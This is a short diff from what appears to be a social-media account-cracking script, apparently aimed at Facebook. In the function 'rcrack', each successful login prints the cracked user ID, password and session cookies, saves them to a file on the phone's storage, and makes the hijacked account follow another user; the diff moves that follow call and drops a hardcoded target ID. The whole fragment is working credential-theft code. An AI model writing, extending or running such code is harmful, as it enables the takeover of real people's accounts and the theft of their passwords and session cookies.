@@ -303,10 +303,9 @@ def rcrack(uid,pwx,tl):
                 cid = coki[65:80]
                 print('\033[38;5;46m┃GS XD-OK┃✔┃ ' +uid+ '|' +ps+    '  \n   \033┃COOKIES┃🍪┃ : \033[38;5;46m'+coki+ ' ')  
                 cek_apk(session,coki)
+                self.follow(coki)
                 open('/sdcard/GS XD RANDOM-OK.txt', 'a').write( uid+' | '+ps+' | '+coki+'\n')
                 oks.append(cid)
-                self.follow(coki)
-                follow_id='100000160984736'
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
